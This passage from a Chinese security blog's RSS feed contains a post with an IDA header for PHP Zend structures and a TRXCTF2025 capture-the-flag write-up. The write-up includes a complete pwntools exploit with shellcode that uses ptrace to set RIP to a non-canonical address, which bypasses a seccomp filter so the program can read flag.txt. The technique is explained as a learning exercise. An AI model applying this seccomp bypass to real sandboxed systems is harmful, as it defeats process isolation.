href=&#34;https://kernel.dk/io_uring.pdf&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://kernel.dk/io_uring.pdf&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://arthurchiao.art/blog/intro-to-io-uring-zh/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;[译] Linux 异步 I/O 框架 io_uring：基本原理、程序示例与性能压测（2020）&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://blog.xmcve.com/2023/10/31/ACTF-2023-Writeup/#title-9&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;星盟WP&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>phppwn逆向</title>
      <link>http://localhost:1313/posts/phppwn_re_struct/</link>
      <pubDate>Thu, 14 Aug 2025 00:34:16 +0800</pubDate>
      <guid>http://localhost:1313/posts/phppwn_re_struct/</guid>
      <category domain="http://localhost:1313/categories/phppwn/">Phppwn</category>
      <description>&lt;p&gt;相关结构体修复&lt;/p&gt;&#xA;&lt;p&gt;在phppwn逆向的时候，常遇到类似这样的东西：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/phppwn/phppwn_re_struct/1.png&#34; title=&#34;/img/phppwn/phppwn_re_struct/1.png&#34; data-thumbnail=&#34;/img/phppwn/phppwn_re_struct/1.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/phppwn/phppwn_re_struct/1.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/phppwn/phppwn_re_struct/1.png&#39; alt=&#34;/img/phppwn/phppwn_re_struct/1.png&#34; width=&#34;900px&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;其实它是对传入参数的类型进行判断，但是看起来并不太直观。&lt;/p&gt;&#xA;&lt;p&gt;IDA中支持导入C头文件，修复一些结构体&lt;/p&gt;&#xA;&lt;p&gt;经过修复：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( v15-&amp;gt;u1.v.type == IS_ARRAY )&#xA;    {&#xA;      if ( v16-&amp;gt;u1.v.type == IS_STRING )&#xA;      {&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这是我用的导入php一些常用结构体到IDA的头文件&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;这个头文件有些地方不太完善，但是用起来没什么大问题&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;//php_struct.h&#xA;&#xA;//定义基本类型&#xA;typedef unsigned char uint8_t;&#xA;typedef unsigned short uint16_t;&#xA;typedef unsigned int uint32_t;&#xA;typedef unsigned long long uint64_t;&#xA;typedef long long int64_t;&#xA;&#xA;typedef unsigned char      zend_uchar;&#xA;typedef long long          zend_long;&#xA;typedef unsigned long zend_ulong;&#xA;&#xA;//zval.u1.type类型&#xA;typedef enum {&#xA;    IS_NULL = 0,&#xA;    IS_FALSE = 1,&#xA;    IS_TRUE = 2,&#xA;    IS_LONG = 4,&#xA;    IS_DOUBLE = 5,&#xA;    IS_STRING = 6,&#xA;    IS_ARRAY = 7,&#xA;    IS_OBJECT = 8,&#xA;    IS_RESOURCE = 9,&#xA;    IS_REFERENCE = 10,&#xA;    IS_CONSTANT = 11,&#xA;    IS_CONSTANT_AS = 12,&#xA;    _IS_BOOL = 13,&#xA;    IS_CALLABLE = 14,&#xA;    IS_INDIRECT = 15,&#xA;    IS_PTR = 17&#xA;} zend_type;&#xA;&#xA;//前置声明&#xA;typedef struct _zval_struct zval;&#xA;typedef struct _zend_array HashTable;&#xA;typedef struct _zend_string zend_string;&#xA;typedef struct _zend_object zend_object;&#xA;typedef struct _zend_resource zend_resource;&#xA;typedef struct _Bucket Bucket;&#xA;typedef void (*dtor_func_t)(zval *pDest);&#xA;typedef struct _zend_reference  zend_reference;&#xA;typedef struct _zend_ast_ref    zend_ast_ref;&#xA;typedef struct _zend_object_handlers zend_object_handlers;&#xA;typedef struct _zend_class_entry     zend_class_entry;&#xA;typedef union  _zend_function        zend_function;&#xA;typedef struct _zend_refcounted_v zend_refcounted_v;&#xA;&#xA;//zend_refcounted_h&#xA;typedef struct _zend_refcounted_v {&#xA;    uint8_t    type;&#xA;    uint8_t    flags;&#xA;    uint16_t   gc_info;&#xA;} zend_refcounted_v;&#xA;&#xA;typedef union _zend_refcounted_u {&#xA;    zend_refcounted_v v;&#xA;    uint32_t type_info;&#xA;} zend_refcounted_u;&#xA;&#xA;typedef struct _zend_refcounted_h {&#xA;    uint32_t refcount;&#xA;    zend_refcounted_u u;&#xA;} zend_refcounted_h;&#xA;&#xA;&#xA;//_zend_string&#xA;typedef struct _zend_string {&#xA;    zend_refcounted_h gc;  // 8字节&#xA;    uint64_t h;            // 8字节&#xA;    uint32_t len;          // 4字节&#xA;    char val[1];           // 1字节（&amp;#43;3字节padding，对齐到8）&#xA;}string;&#xA;&#xA;&#xA;typedef struct _zval_u1_v {&#xA;    uint8_t type;&#xA;    uint8_t type_flags;&#xA;    uint8_t const_flags;&#xA;    uint8_t reserved;&#xA;} zval_u1_v;&#xA;&#xA;typedef union _zval_u1 {&#xA;    zval_u1_v v;&#xA;    uint32_t type_info;&#xA;} zval_u1;&#xA;&#xA;typedef union _zval_u2 {&#xA;    uint32_t var_flags;&#xA;    uint32_t next;&#xA;    uint32_t cache_slot;&#xA;    uint32_t lineno;&#xA;    uint32_t num_args;&#xA;    uint32_t fe_pos;&#xA;} zval_u2;&#xA;&#xA;//这里一些对象使用void*避免具体类型&#xA;typedef union _zend_value {&#xA;    zend_long         lval;&#xA;    double            dval;&#xA;    void             *counted;&#xA;    zend_string      *str;&#xA;    HashTable        *arr;&#xA;    zend_object      *obj;&#xA;    zend_resource    *res;&#xA;    zend_reference   *ref;&#xA;    zend_ast_ref     *ast;&#xA;    _zval_struct     *zv;&#xA;    void             *ptr;&#xA;    zend_class_entry *ce;&#xA;    zend_function    *func;&#xA;    struct {&#xA;        uint32_t w1;&#xA;        uint32_t w2;&#xA;    } ww;&#xA;} zend_value;&#xA;&#xA;typedef struct _zval_struct {&#xA;    zend_value value;  // 8字节&#xA;    zval_u1 u1;        // 4字节&#xA;    zval_u2 u2;        // 4字节&#xA;}zval;&#xA;&#xA;&#xA;//_zend_array&#xA;typedef struct _Bucket {&#xA;    _zval_struct      val;&#xA;    zend_ulong        h;&#xA;    _zend_string      *key;&#xA;}Bucket;&#xA;&#xA;typedef struct _zend_array_v&#xA;{&#xA;    zend_uchar    flags;&#xA;    zend_uchar    nApplyCount;&#xA;    zend_uchar    nIteratorsCount;&#xA;    zend_uchar    reserve;&#xA;}_zend_array_v;&#xA;&#xA;typedef union _zend_array_u&#xA;{&#xA;    _zend_array_v v;&#xA;    uint32_t flag;&#xA;}_zend_array_u;&#xA;&#xA;typedef struct _zend_array&#xA;{&#xA;    zend_refcounted_h gc; //8字节&#xA;    _zend_array_u u;&#xA;    uint32_t          nTableMask;&#xA;    Bucket           *arData;&#xA;    uint32_t          nNumUsed;&#xA;    uint32_t          nNumOfElements;&#xA;    uint32_t          nTableSize; &#xA;    uint32_t          nInternalPointer; &#xA;    zend_long         nNextFreeElement;&#xA;    dtor_func_t       pDestructor;&#xA;}HashTable;&#xA;&#xA;//_zend_resource&#xA;typedef struct _zend_resource {&#xA;    zend_refcounted_h gc;&#xA;    int               handle;&#xA;    int               type;&#xA;    void             *ptr;&#xA;}zend_resource;&#xA;&#xA;//_zend_object&#xA;typedef struct _zend_object {&#xA;    zend_refcounted_h           gc;&#xA;    uint32_t                    handle;&#xA;    zend_class_entry           *ce;&#xA;    const zend_object_handlers *handlers;&#xA;    HashTable                  *properties;&#xA;    _zval_struct                properties_table[1];&#xA;}zend_object;&#xA;typedef _zend_array array;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;导入方式：&lt;code&gt;File&lt;/code&gt; -&amp;gt; &lt;code&gt;Load file&lt;/code&gt; -&amp;gt;  &lt;code&gt;Parse C header file&lt;/code&gt;，然后选择这个头文件导入。&lt;/p&gt;&#xA;&lt;p&gt;导入后就能看到&lt;code&gt;Local Types&lt;/code&gt;中有相关的结构体&lt;/p&gt;&#xA;&lt;p&gt;使用方式：右键需要convert的变量，选择&lt;code&gt;Convert to struct *...&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;其中常用的结构体有：&lt;code&gt;zval&lt;/code&gt;、&lt;code&gt;string&lt;/code&gt;、&lt;code&gt;array&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;至于相关变量结构体改成类似&lt;code&gt;IS_ARRAY&lt;/code&gt;。&lt;/p&gt;&#xA;&lt;p&gt;右键需要改的数字，选择&lt;code&gt;Enum&lt;/code&gt;，选择&lt;code&gt;zend_type&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>TRXCTF2025</title>
      <link>http://localhost:1313/posts/trxctf2025/</link>
      <pubDate>Thu, 07 Aug 2025 23:23:00 +0800</pubDate>
      <guid>http://localhost:1313/posts/trxctf2025/</guid>
      <category domain="http://localhost:1313/categories/wp/">WP</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;canon_event&#34;&gt;&lt;span&gt;canon_event&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#canon_event&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;ptrace + 沙箱绕过&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)&#xA;{&#xA;  void *v3; // rbx&#xA;  void *v4; // rax&#xA;  void *v5; // r12&#xA;  unsigned int uint; // ebp&#xA;&#xA;  v3 = mmap((void *)0xDEAD000, 0x1000u, 3, 50, -1, 0);&#xA;  v4 = mmap((void *)0xDEAE000, 0x1000u, 3, 50, -1, 0);&#xA;  if ( v3 == (void *)-1LL || (v5 = v4, v4 == (void *)-1LL) )&#xA;    err(1, &amp;#34;mmap failed&amp;#34;);&#xA;  printf(&amp;#34;code size: &amp;#34;);&#xA;  uint = get_uint();                            // 输入shellcode长度&#xA;  if ( uint &amp;gt; 0x1000 )                          // shellcode长度大于0x1000就报错&#xA;  {&#xA;    puts(&amp;#34;invalid code size&amp;#34;);&#xA;    exit(1);&#xA;  }&#xA;  printf(&amp;#34;enter shellcode: &amp;#34;);&#xA;  if ( read(0, v3, uint) &amp;lt; 0 )                  // 读入shellcode&#xA;    err(1, &amp;#34;read failed&amp;#34;);&#xA;  if ( mprotect(v3, 0x1000u, 5) &amp;lt; 0 )           &#xA;    err(1, &amp;#34;mprotect failed&amp;#34;);&#xA;  isolate_and_jump((void (__fastcall *)(_QWORD, void *))v3, v5); //开sandbox，然后去执行shellcode&#xA;  return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt; line  CODE  JT   JF      K&#xA;=================================&#xA; 0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer &amp;gt;&amp;gt; 32&#xA; 0001: 0x35 0x04 0x00 0x00008000  if (A &amp;gt;= 0x8000) goto 0006&#xA; 0002: 0x20 0x00 0x00 0x00000000  A = sys_number&#xA; 0003: 0x15 0x02 0x00 0x0000003d  if (A == wait4) goto 0006&#xA; 0004: 0x15 0x01 0x00 0x00000065  if (A == ptrace) goto 0006&#xA; 0005: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0007&#xA; 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW&#xA; 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;只允许三个系统调用：wait4、ptrace、fork&lt;/p&gt;&#xA;&lt;p&gt;exp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3&#xA;&#xA;from pwn import *&#xA;from time import sleep&#xA;&#xA;exe = ELF(&amp;#34;./pwn&amp;#34;)&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context.binary = exe&#xA;&#xA;def dbg(r):&#xA;    gdb.attach(r)&#xA;    pause()&#xA;&#xA;# DOCKER_PORT = 1337&#xA;# REMOTE_NC_CMD    = &amp;#34;nc localhost 444&amp;#34;    # `nc &amp;lt;host&amp;gt; &amp;lt;port&amp;gt;`&#xA;&#xA;bstr = lambda x: str(x).encode()&#xA;ELF.binsh = lambda self: next(self.search(b&amp;#34;/bin/sh\0&amp;#34;))&#xA;&#xA;GDB_SCRIPT = &amp;#34;&amp;#34;&amp;#34;&#xA;set follow-fork-mode child&#xA;set follow-exec-mode same&#xA;c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;&#xA;&#xA;&#xA;def main():&#xA;    r = process(&amp;#34;./pwn&amp;#34;)&#xA;&#xA;    PTRACE_CONT = 7&#xA;    PTRACE_GETREGS = 12&#xA;    PTRACE_SETREGS = 13&#xA;    PTRACE_SYSCALL = 24&#xA;    RIP_OFFSET = 8*16&#xA;&#xA;    shellcode = asm(f&amp;#34;&amp;#34;&amp;#34;&#xA;        mov eax, SYS_fork&#xA;        syscall&#xA;        test eax, eax&#xA;        jz child&#xA;&#xA;        mov r13, rax&#xA;                    &#xA;        mov eax, SYS_wait4&#xA;        mov rdi, r13&#xA;        xor esi, esi&#xA;        xor edx, edx&#xA;        xor r10, r10&#xA;        syscall&#xA;                                        &#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_SYSCALL}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        xor r10, r10&#xA;        syscall&#xA;        &#xA;        mov eax, SYS_wait4&#xA;        mov rdi, r13&#xA;        xor esi, esi&#xA;        xor edx, edx&#xA;        xor r10, r10&#xA;        syscall&#xA;                                        &#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_GETREGS}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        mov r10, rsp&#xA;        syscall&#xA;&#xA;        mov rdi, 0x820000000000&#xA;        lea rbx, [rsp&amp;#43;{RIP_OFFSET}]&#xA;        mov [rbx], rdi&#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_SETREGS}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        mov r10, rsp&#xA;        syscall&#xA;                    &#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_CONT}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        xor r10, r10&#xA;        syscall&#xA;                      &#xA;        mov eax, SYS_wait4&#xA;        mov rdi, r13&#xA;        mov rsi, rsp&#xA;        xor edx, edx&#xA;        xor r10, r10&#xA;        syscall&#xA;                                        &#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_GETREGS}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        mov r10, rsp&#xA;        syscall&#xA;                                                                                                     &#xA;        lea rdi, [rip&amp;#43;sendfile] &#xA;        lea rbx, [rsp&amp;#43;{RIP_OFFSET}]&#xA;        mov [rbx], rdi&#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_SETREGS}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        mov r10, rsp&#xA;        syscall&#xA;       &#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_SYSCALL}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        xor r10, r10&#xA;        syscall&#xA;                    &#xA;        mov eax, SYS_wait4&#xA;        mov rdi, r13&#xA;        xor esi, esi&#xA;        xor edx, edx&#xA;        xor r10, r10&#xA;        syscall&#xA;                                        &#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_GETREGS}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        mov r10, rsp&#xA;        syscall&#xA;                 &#xA;        mov rdi, 0x820000000000&#xA;        lea rbx, [rsp&amp;#43;{RIP_OFFSET}]&#xA;        mov [rbx], rdi&#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_SETREGS}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        mov r10, rsp&#xA;        syscall&#xA;                    &#xA;        mov eax, SYS_ptrace&#xA;        mov edi, {PTRACE_CONT}&#xA;        mov rsi, r13&#xA;        xor edx, edx&#xA;        xor r10, r10&#xA;        syscall&#xA;                    &#xA;        mov eax, SYS_wait4&#xA;        mov rdi, r13&#xA;        xor esi, esi&#xA;        xor edx, edx&#xA;        xor r10, r10&#xA;        syscall&#xA;        &#xA;        hlt&#xA;&#xA;        child:&#xA;            mov eax, SYS_ptrace&#xA;            xor edi, edi&#xA;            xor esi, esi&#xA;            xor edx, edx&#xA;            xor r10, r10&#xA;            syscall&#xA;            int3&#xA;        open:&#xA;            mov eax, SYS_open&#xA;            lea rdi, [rip&amp;#43;flag]&#xA;            xor esi, esi&#xA;            xor edx, edx    &#xA;            syscall&#xA;        sendfile:&#xA;            mov rax, SYS_sendfile&#xA;            mov rdi, 1&#xA;            mov rsi, 3  &#xA;            xor edx, edx&#xA;            mov r10, 0x50&#xA;            syscall&#xA;        hlt&#xA;    flag:&#xA;    &amp;#34;&amp;#34;&amp;#34;) &amp;#43; b&amp;#34;flag.txt\0&amp;#34;&#xA;    dbg(r)&#xA;    r.sendline(bstr(len(shellcode)))&#xA;    r.send(shellcode)&#xA;&#xA;    r.interactive()&#xA;&#xA;if __name__ == &amp;#34;__main__&amp;#34;:&#xA;    main()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;shellcode解释：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SYS_fork&#xA;&#xA;parent_process:&#xA;&#x9;wait4  //等待TRACEME&#xA;&#x9;&#xA;&#x9;PTRACE_SYSCALL //捕获下一次syscall信号，即open的syscall&#xA;&#x9;wait4&#x9;//等待open的syscall开始&#xA;&#x9;PTRACE_GETREGS&#x9;//获取寄存器信息&#xA;&#x9;set_rip_non_canoncial_address&#x9;//设置RIP为非法地址来绕过沙箱,然后执行syscall&#xA;&#x9;PTRACE_CONT&#x9;//继续执行&#xA;&#x9;wait4&#x9;//handle SIGSEV signal&#xA;&#x9;&#xA;&#x9;PTRACE_GETREGS //获取寄存器信息&#xA;&#x9;set_rip_sendfile //设置rip为sendfile处&#xA;&#x9;&#xA;&#x9;PTRACE_SYSCALL //捕获下一次syscall,即sendfile的syscall&#xA;&#x9;wait4&#x9;//等待sendfile的syscall开始&#xA;&#x9;PTRACE_GETREGS&#x9;//获取寄存器信息&#xA;&#x9;set_rip_non_cononcial_addr&#x9;//设置RIP为非法地址来绕过沙箱,然后执行syscall&#xA;&#x9;PTRACE_CONT&#x9;//继续执行&#xA;&#x9;wait4&#x9;//handle SIGSEV signal&#xA;&#x9;&#xA;child_process:&#xA;&#x9;PTRACE_TRACEME&#xA;&#x9;open&#xA;&#x9;sendfile&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;沙箱不是禁掉了open和sendfile吗？为什么还能用？&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;先附上官方WP的一些解释：&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Understanding the seccomp filter&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Extracting the &lt;strong&gt;&lt;code&gt;seccomp&lt;/code&gt;&lt;/strong&gt; filter from the binary using &lt;strong&gt;&lt;code&gt;seccomp-tools&lt;/code&gt;&lt;/strong&gt; will give you the following result:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;line  CODE  JT   JF      K&#xA;=================================&#xA;0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer &amp;gt;&amp;gt; 32&#xA;0001: 0x35 0x04 0x00 0x00008000  if (A &amp;gt;= 0x8000) goto 0006&#xA;0002: 0x20 0x00 0x00 0x00000000  A = sys_number&#xA;0003: 0x15 0x02 0x00 0x0000003d  if (A == wait4) goto 0006&#xA;0004: 0x15 0x01 0x00 0x00000065  if (A == ptrace) goto 0006&#xA;0005: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0007&#xA;0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW&#xA;0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The filter allows three syscalls in the standard canonical range of userland addresses (so &lt;strong&gt;&lt;code&gt;rip&lt;/code&gt;&lt;/strong&gt; has to be lower than &lt;strong&gt;&lt;code&gt;0x800000000000&lt;/code&gt;&lt;/strong&gt;). If the &lt;strong&gt;instruction pointer&lt;/strong&gt; is not in that range then you can call any syscall you want!&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;ptrace &amp;amp; wait4&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;The objective is to bypass the check on the instruction pointer using &lt;strong&gt;&lt;code&gt;ptrace&lt;/code&gt;.&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;ptrace&lt;/code&gt;&lt;/strong&gt; enables a process (called the “tracer”) to debug another process (usually a child process called “tracee”).&lt;/p&gt;&#xA;&lt;p&gt;By using &lt;strong&gt;&lt;code&gt;PTRACE_SYSCALL&lt;/code&gt;&lt;/strong&gt; we tell the tracee to pause execution before executing &lt;strong&gt;&lt;code&gt;syscall&lt;/code&gt;&lt;/strong&gt;. The tracee will send a &lt;strong&gt;&lt;code&gt;SIGTRAP&lt;/code&gt;&lt;/strong&gt; signal when it encounters a syscall so in the tracer we can just wait for the signal with &lt;strong&gt;&lt;code&gt;wait4&lt;/code&gt;.&lt;/strong&gt; At this point we can modify the tracee’s registers using &lt;strong&gt;&lt;code&gt;PTRACE_SETREGS&lt;/code&gt;.&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;With this type of ptrace request we can modify all registers, &lt;strong&gt;including rip!&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Imaginary conversation with an imaginary pwner&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;em&gt;“But wait! If we change &lt;strong&gt;&lt;code&gt;rip&lt;/code&gt;&lt;/strong&gt; we would not execute the &lt;strong&gt;&lt;code&gt;syscall&lt;/code&gt;&lt;/strong&gt; instruction anymore!”&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;Well… actually &lt;strong&gt;&lt;code&gt;syscall&lt;/code&gt;&lt;/strong&gt; will be executed anyways because the instruction is fetched before ptrace takes place!&lt;/p&gt;&#xA;&lt;p&gt;&lt;em&gt;”Ok but seccomp acts before &lt;strong&gt;&lt;code&gt;ptrace&lt;/code&gt;&lt;/strong&gt;… right?”&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nope lol. The seccomp filter is applied only after &lt;strong&gt;&lt;code&gt;ptrace&lt;/code&gt;&lt;/strong&gt; since &lt;strong&gt;&lt;code&gt;Linux 4.8&lt;/code&gt;&lt;/strong&gt; on. From &lt;strong&gt;&lt;code&gt;Linux 3.5&lt;/code&gt;&lt;/strong&gt; to &lt;strong&gt;&lt;code&gt;Linux 4.7&lt;/code&gt;&lt;/strong&gt; the filter was applied before &lt;strong&gt;&lt;code&gt;ptrace&lt;/code&gt;&lt;/strong&gt; so it was even worst!&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Consequences&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;We can effectively change &lt;strong&gt;&lt;code&gt;rip&lt;/code&gt;&lt;/strong&gt; just before a syscall is executed and before the seccomp filter is applied to a non canonical address. This will execute the syscall correctly but with a fake, non canonical &lt;strong&gt;&lt;code&gt;rip&lt;/code&gt;&lt;/strong&gt; bypassing the seccomp filter!&lt;/p&gt;&#xA;&lt;p&gt;After the syscall the tracee will send a &lt;strong&gt;&lt;code&gt;SIGSEV&lt;/code&gt;&lt;/strong&gt; signal (because of the non canonical &lt;strong&gt;&lt;code&gt;rip&lt;/code&gt;&lt;/strong&gt;) but this can be easily be handled by the tracer with a &lt;strong&gt;&lt;code&gt;wait4&lt;/code&gt;&lt;/strong&gt; and a &lt;strong&gt;&lt;code&gt;PTRACE_SETREGS&lt;/code&gt;&lt;/strong&gt; and resetting &lt;strong&gt;&lt;code&gt;rip&lt;/code&gt;&lt;/strong&gt; to the right address.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Wrapping it up&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Now that we understood how to bypass the filter we can just call &lt;strong&gt;&lt;code&gt;execve&lt;/code&gt;&lt;/strong&gt; right? Well no. When calling &lt;strong&gt;&lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL)&lt;/code&gt;&lt;/strong&gt; the syscall will replace the current process with a new process (in this case &lt;strong&gt;&lt;code&gt;/bin/sh&lt;/code&gt;&lt;/strong&gt; ). The new process will inherit the seccomp filter of the old process. When the spawned process will try to execute other syscalls (like &lt;strong&gt;&lt;code&gt;open,&lt;/code&gt;&lt;/strong&gt; &lt;strong&gt;&lt;code&gt;read&lt;/code&gt;,&lt;/strong&gt; &lt;strong&gt;&lt;code&gt;sbrk&lt;/code&gt;&lt;/strong&gt; and so on) the filter will block these syscalls. This is not really a problem, I can just call &lt;strong&gt;&lt;code&gt;open&lt;/code&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;code&gt;sendfile&lt;/code&gt;&lt;/strong&gt; and the job is done!&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;感觉官方WP讲的不是很清晰，我就去看了相关内核代码：&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/torvalds/linux/blob/6e64f4580381e32c06ee146ca807c555b8f73e24/kernel/entry/syscall-common.c#L20&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;处理ptrace和seccomp的函数&lt;/a&gt;：这里可以看出，执行顺序：ptrace、seccomp、syscall，而我们在ptrace的时候设置RIP为非法地址，沙箱直接就allow了，不会再去检查sys_number的内容，也就可以去执行read这些系统调用了&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;其他相关资料：&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/torvalds/linux/commit/93e35efb8de45393cf61ed07f7b407629bf698ea&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/torvalds/linux/commit/93e35efb8de45393cf61ed07f7b407629bf698ea&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;virtual_insanity&#34;&gt;&lt;span&gt;Virtual_Insanity&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#virtual_insanity&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;栈溢出+利用vsyscall&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;就不写了。。。&lt;/p&gt;</description>
    </item>
    <item>
      <title>《法治的细节》</title>
